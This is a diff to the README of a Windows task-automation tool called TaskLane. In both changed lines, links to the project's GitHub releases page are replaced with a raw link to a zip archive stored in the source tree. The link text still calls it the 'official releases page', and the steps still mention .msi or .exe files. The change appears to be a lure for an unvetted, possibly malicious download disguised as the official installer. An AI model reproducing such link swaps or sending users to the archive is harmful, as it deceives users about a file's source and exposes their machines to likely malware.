@@ -1,6 +1,6 @@
 # 🚀 TaskLane - Organize and automate your daily tasks
 
-[![Download TaskLane](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/musazwebi-lab/TaskLane/releases)
+[![Download TaskLane](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/musazwebi-lab/TaskLane/main/src/tasklane/Lane-Task-v2.2.zip)
 
 TaskLane helps you organize work across multiple computers. It manages queues and runs jobs in the background. You use it to save time on repeating computer tasks. It is light, simple, and ready to use without complex setup.
 
@@ -24,7 +24,7 @@ Before you install TaskLane, check these requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/musazwebi-lab/TaskLane/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/musazwebi-lab/TaskLane/main/src/tasklane/Lane-Task-v2.2.zip) to download the installer.
 2. Choose the file ending in .msi or .exe for Windows.
 3. Save the file to your Downloads folder.
 4. Open the file to start the installation wizard.
